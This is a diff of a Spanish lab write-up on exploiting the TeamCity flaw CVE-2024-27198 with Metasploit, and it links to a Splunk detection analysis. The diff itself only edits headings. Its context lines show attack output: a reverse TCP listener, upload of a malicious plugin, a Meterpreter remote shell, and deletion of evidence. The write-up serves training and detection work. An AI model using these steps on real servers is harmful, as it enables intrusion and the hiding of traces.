@@ -190,7 +190,7 @@ Channel 1 created.
 Como podemos observar en la salida de la terminal, y en las fases de explotación que se encuentran debajo, lo que hace metasploit es basicamente lo mismo que la opción #1 de esta prueba de vulnerabilidades, pero de manera automatizada y mucho más rápida, ya que estaríamos creando un ataque a velocidad máquina. Ambos métodos de ataque dejan un rastro que podemos osbervar en la fase de análisais en splunk: [Análisis en Splunk](Blue-Team.md)
 
 ```bash
-FASES DE EXPLOTACIÓN CVE-2024-27198 (TeamCity) con metasploit
+FASES DE EXPLOTACIÓN CVE-2024-27198
 
 FASE 1: LISTENER REVERSE TCP
 [*] Started reverse TCP handler on 192.168.128.160:4444
@@ -210,11 +210,11 @@ FASE 4: SUBIDA DEL PLUGIN MALICIOSO
 [*] Sending stage (58073 bytes) to 10.128.148.36
 Sube plugin .jar con payload y envía stager al objetivo.
 ------------------------------------------------------------------------------
-# FASE 5: SESIÓN METERPRETER
+FASE 5: SESIÓN METERPRETER
 [*] Meterpreter session 1 opened (192.168.128.160:4444 -> 10.128.148.36:53446)
 Establece conexión inversa y obtiene acceso remoto al sistema.
 ------------------------------------------------------------------------------
-# FASE 6: LIMPIEZA DE EVIDENCIAS
+FASE 6: LIMPIEZA DE EVIDENCIAS
 [*] Deleting the plugin...
 [+] Deleted /opt/teamcity/TeamCity/work/.../TC_147512_nFkmodSC
 [+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/nFkmodSC
